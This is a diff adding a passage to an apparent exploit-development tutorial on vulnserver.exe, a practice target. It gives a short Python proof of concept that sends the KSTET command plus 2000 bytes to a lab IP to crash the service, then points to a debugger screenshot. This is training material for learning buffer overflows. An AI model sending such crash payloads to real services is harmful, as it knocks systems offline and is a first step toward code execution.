@@ -60,3 +60,25 @@ The __fourth__ parameter, `int flags`, is a numerical value that will allow for 
 
 Finding the Call to WS_32.recv()
 ---
+As any network based buffer overflow works, we find a vulnerable parameter, command, or other field- and send data to that parameter. Here is the POC does just that:
+
+```python
+import os
+import sys
+import socket
+
+# Vulnerable command
+command = "KSTET "
+
+# 2000 bytes to crash vulnserver.exe
+crash = "\x41" * 2000
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.143", 9999))
+
+s.send(command+crash)
+```
+
+After executing the POC, here is what the debugger shows:
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/01.png" alt="">
